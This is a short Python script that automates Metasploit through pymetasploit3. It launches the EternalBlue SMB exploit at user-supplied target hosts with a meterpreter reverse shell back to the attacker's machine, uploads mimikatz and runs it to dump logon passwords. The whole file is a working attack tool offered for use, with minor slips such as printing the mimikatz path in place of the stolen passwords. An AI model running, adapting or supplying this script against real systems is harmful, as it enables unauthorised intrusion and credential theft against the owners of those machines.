from pymetasploit3.msfrpc import MsfRpcClient

def exploit(msf_rpc_client_password, rhosts, lhosts, lport,
			mimikatz_directory):
	client = MsfRpcClient(msf_rpc_client_password, ssl="False")
	exploit = client.modules.use('exploit',
								 'windows/smb/ms17_010_eternalblue')
	exploit['RHOSTS'] = rhosts
	payload = client.modules.use('payload',
								 'windows/x64/meterpreter/reverse_tcp')
	payload['LHOST'] = lhosts
	payload['LPORT'] = lport
	exploit.execute(payload=payload)
	shell = client.sessions.session('0')
	shell.write('mkdir C:/mimi/')
	shell.write('mkdir C:/mimi/Win32/')
	shell.write('mkdir C:/mimi/x64/')
	shell.write('upload '+mimikatz_directory+' C:/mimikatz/')
	shell.write('upload '+ mimikatz_directory+'/Win32 C:/mimi/Win32')
	shell.write('upload '+mimikatz_directory+'/x64 C:/mimi/x64')
	shell.write('shell')
	shell.write('cd C:/mimi/x64')
	shell.write('mimikatz.exe')
	shell.write('privilege::debug')
	shell.write('sekurlsa::logonPasswords')
	passwords = shell.read()
	return passwords

def main():
	msf_rpc_client_password = input("enter MsfRpc password: ")
	rhosts = input("enter RHOSTS: ")
	lhosts = input("enter LHOST: ")
	lport = input("enter LPORT: ")
	mimikatz_directory = input("enter mimikatz directory on your computer "
							   "(Ex: home/user/mimikatz): ")
	passwords = exploit(msf_rpc_client_password, rhosts, lhosts, lport,
						mimikatz_directory)
	print(mimikatz_directory)

if __name__ == "__main__":
	main()